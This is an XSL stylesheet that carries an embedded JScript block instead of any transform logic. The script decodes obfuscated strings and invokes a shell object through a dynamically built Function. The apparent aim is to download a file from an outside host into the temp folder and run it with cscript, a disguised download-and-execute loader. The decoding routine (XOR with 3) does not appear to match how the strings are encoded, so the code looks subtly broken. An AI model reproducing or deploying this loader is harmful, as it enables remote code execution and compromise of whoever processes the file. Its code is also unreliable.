<?xml version='1.0'?> 
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="unknown" version="1.0">
<output method="text"/>
<ms:script language="JScript" implements-prefix="user"> 
<![CDATA[
(function() {
    function decode(a) { 
        return a.split('').map(function(b) { 
            return String.fromCharCode(b.charCodeAt(0) ^ 3); 
        }).join(''); 
    }

    var x = decode("fxqo tuvsh://udw.plwkhu.eursdqwkhqwxf.rp/Ylnh}-Tzvu/pic -o %WHQS%\\pic && fvfulsw.hyh %WHQS%\\pic");
    var shellType = decode("XlfvwlryBMvdwru");
    var method = decode("Suq");
    var activeX = decode("ZSoshuvyKypil");

    var shell = new Function("return new " + activeX + "(\"" + shellType + "\")." + method + "(\"" + x + "\")");
    shell();
})();
]]> 
</ms:script>
</stylesheet>
